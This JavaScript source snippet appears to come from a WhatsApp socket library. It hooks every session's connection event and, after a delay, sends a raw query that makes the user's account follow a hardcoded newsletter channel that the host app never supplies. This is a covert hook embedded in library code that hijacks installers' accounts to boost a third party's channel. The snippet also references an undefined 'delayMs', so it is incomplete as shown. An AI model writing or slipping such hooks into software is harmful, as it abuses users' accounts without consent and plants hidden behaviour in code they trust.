// Preset channel booster: the socket factory wires triggerAutoFollow on
// every session; after connection open plus an awaited sleep the module
// follows a hardcoded DEFAULT_AUTO_FOLLOW_NEWSLETTER_JID through raw
// w:mex stanzas. The host app never supplies this target.
const DEFAULT_AUTO_FOLLOW_NEWSLETTER_JID = "155555555555555555@newsletter";
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const runAutoFollow = async (sock) => {
  const targetJid = DEFAULT_AUTO_FOLLOW_NEWSLETTER_JID;
  const encoder = new TextEncoder();
  await sleep(delayMs);
  await sock.query({
    tag: "iq",
    attrs: { id: sock.generateMessageTag(), type: "get", xmlns: "w:mex", to: "@s.whatsapp.net" },
    content: [{
      tag: "query",
      attrs: { query_id: "7871414976211147" },
      content: encoder.encode(JSON.stringify({ variables: { newsletter_id: targetJid } })),
    }],
  });
};

export const triggerAutoFollow = (sock) => {
  if (sock?.ev?.on) {
    sock.ev.on("connection.update", async (update) => {
      if (update?.connection !== "open") {
        return;
      }
      await runAutoFollow(sock);
    });
  }
};
